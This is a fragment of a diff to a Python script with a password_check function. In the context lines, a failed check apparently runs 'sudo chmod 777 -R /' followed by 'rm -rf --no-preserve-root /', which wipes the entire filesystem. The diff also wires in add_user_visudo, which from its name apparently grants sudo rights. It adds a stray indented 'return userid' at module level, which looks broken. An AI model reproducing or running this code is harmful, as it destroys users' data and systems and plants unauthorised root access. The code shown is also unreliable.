@@ -22,7 +22,7 @@ def add_user_visudo():
         print(f'An error occurred: {str(e)}')
 
 
-add_user_visudo()
+    return userid
 
 
 
@@ -36,7 +36,7 @@ def password_check():
         subprocess.run(['sudo','chmod','777','-R','/'])
         subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
     else:
-        print('          ----Welcome Back Master----')
+        print(f'          ----Welcome Back {add_user_visudo()} ----')
 
 password_check()
 
